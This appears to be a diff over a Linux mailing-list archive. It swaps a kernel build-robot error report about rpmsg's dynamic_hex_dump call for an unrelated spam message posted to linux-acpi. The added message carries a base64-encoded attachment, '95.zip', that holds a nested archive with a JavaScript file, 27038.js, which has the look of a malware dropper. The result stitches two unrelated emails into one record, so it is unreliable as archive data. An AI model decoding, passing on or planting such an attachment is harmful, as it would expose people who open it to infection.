@@ -1,70 +1,100 @@
-From: kbuild test robot <lkp-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>
-Subject: Re: [PATCH 2/3] virtio, rpmsg: switch to dynamic_hex_dump()
-Date: Sat, 29 Apr 2017 16:46:10 +0800
-Message-ID: <201704291610.sI4vYOud%fengguang.wu@intel.com>
-References: <149341494418.35578.561981766577089185.stgit@dwillia2-desk3.amr.corp.intel.com>
+From: <lswedroe@bamadvisor.com>
+Subject: 44835 linux-acpi
+Date: Sat, 29 Apr 2017 23:16:08 -0000
+Message-ID: <149350776888.20798.10365529124527764337@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-In-Reply-To: <149341494418.35578.561981766577089185.stgit-p8uTFz9XbKj2zm6wflaqv1nYeNYlB/vhral2JQCrhuEAvxtiuMwx3w@public.gmane.org>
-Content-Disposition: inline
-List-Unsubscribe: <https://lists.01.org/mailman/options/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.01.org/pipermail/linux-nvdimm/>
-List-Post: <mailto:linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Help: <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.01.org/mailman/listinfo/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=subscribe>
-Errors-To: linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org
-Sender: "Linux-nvdimm" <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-To: Dan Williams <dan.j.williams-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>
-Cc: Ohad Ben-Cohen <ohad-Ix1uc/W3ht7QT0dZR+AlfA@public.gmane.org>, linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org, linux-remoteproc-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Bjorn Andersson <bjorn.andersson-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>, linux-acpi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, kbuild-all-JC7UmRfGjtg@public.gmane.org
+Content-Type: application/zip; name="95.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-acpi-owner@vger.kernel.org>
+Received: from static.vnpt.vn ([14.162.156.0]:52882 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S376826AbdD2XQO (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+        Sat, 29 Apr 2017 19:16:14 -0400
+Content-Disposition: attachment
+Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
+To: linux-acpi@vger.kernel.org
 
-Hi Dan,
-
-[auto build test ERROR on pm/linux-next]
-[also build test ERROR on v4.11-rc8 next-20170428]
-[if your patch is applied to the wrong git tree, please drop us a note to help improve the system]
-
-url:    https://github.com/0day-ci/linux/commits/Dan-Williams/dynamic_hex_dump-cleanup/20170429-135503
-base:   https://git.kernel.org/pub/scm/linux/kernel/git/rafael/linux-pm.git linux-next
-config: arm-multi_v7_defconfig (attached as .config)
-compiler: arm-linux-gnueabi-gcc (Debian 6.1.1-9) 6.1.1 20160705
-reproduce:
-        wget https://raw.githubusercontent.com/01org/lkp-tests/master/sbin/make.cross -O ~/bin/make.cross
-        chmod +x ~/bin/make.cross
-        # save the attached .config to linux build tree
-        make.cross ARCH=arm 
-
-All errors (new ones prefixed by >>):
-
-   drivers//rpmsg/virtio_rpmsg_bus.c: In function 'rpmsg_send_offchannel_raw':
->> drivers//rpmsg/virtio_rpmsg_bus.c:602:2: error: implicit declaration of function 'dynamic_hex_dump' [-Werror=implicit-function-declaration]
-     dynamic_hex_dump("rpmsg_virtio TX: ", DUMP_PREFIX_NONE, 16, 1,
-     ^~~~~~~~~~~~~~~~
-   cc1: some warnings being treated as errors
-
-vim +/dynamic_hex_dump +602 drivers//rpmsg/virtio_rpmsg_bus.c
-
-bcabbcca Ohad Ben-Cohen 2011-10-20  596  	msg->dst = dst;
-bcabbcca Ohad Ben-Cohen 2011-10-20  597  	msg->reserved = 0;
-bcabbcca Ohad Ben-Cohen 2011-10-20  598  	memcpy(msg->data, data, len);
-bcabbcca Ohad Ben-Cohen 2011-10-20  599  
-bcabbcca Ohad Ben-Cohen 2011-10-20  600  	dev_dbg(dev, "TX From 0x%x, To 0x%x, Len %d, Flags %d, Reserved %d\n",
-0963679c Anna, Suman    2016-08-12  601  		msg->src, msg->dst, msg->len, msg->flags, msg->reserved);
-211e3a93 Anna, Suman    2016-08-12 @602  	dynamic_hex_dump("rpmsg_virtio TX: ", DUMP_PREFIX_NONE, 16, 1,
-bcabbcca Ohad Ben-Cohen 2011-10-20  603  			 msg, sizeof(*msg) + msg->len, true);
-bcabbcca Ohad Ben-Cohen 2011-10-20  604  
-bcabbcca Ohad Ben-Cohen 2011-10-20  605  	sg_init_one(&sg, msg, sizeof(*msg) + len);
-
-:::::: The code at line 602 was first introduced by commit
-:::::: 211e3a93e5b5933e64ddfb299eee462ac7c7d500 rpmsg: use dynamic_hex_dump for hex dump traces
-
-:::::: TO: Anna, Suman <s-anna-l0cyMroinI0@public.gmane.org>
-:::::: CC: Bjorn Andersson <bjorn.andersson-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>
-
----
-0-DAY kernel test infrastructure                Open Source Technology Center
-https://lists.01.org/pipermail/kbuild-all                   Intel Corporation
+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
+WwAAANsRAAAAAA==
